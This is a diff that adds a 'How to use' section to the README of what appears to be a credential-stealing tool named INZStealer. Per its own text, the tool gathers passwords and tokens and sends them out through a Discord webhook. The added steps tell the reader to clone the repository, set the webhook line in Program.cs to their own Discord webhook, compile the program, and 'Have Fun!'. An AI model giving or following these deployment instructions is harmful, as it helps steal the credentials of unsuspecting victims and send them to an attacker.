@@ -10,3 +10,12 @@ First , it gathers all passwords and tokens and then it send them via a Discord 
 
 # TODO
   - Firefox Support
+  
+  
+  
+# HOW TO USE
+  
+  - Clone the repo
+  -Edit this : https://github.com/InstinctEx/INZStealer/blob/26fbccc0392c0bba2652970df73fce65bb7873c3/INZStealer/Program.cs#L20 to your discord webhook
+  -Compile your program
+  -Have Fun!
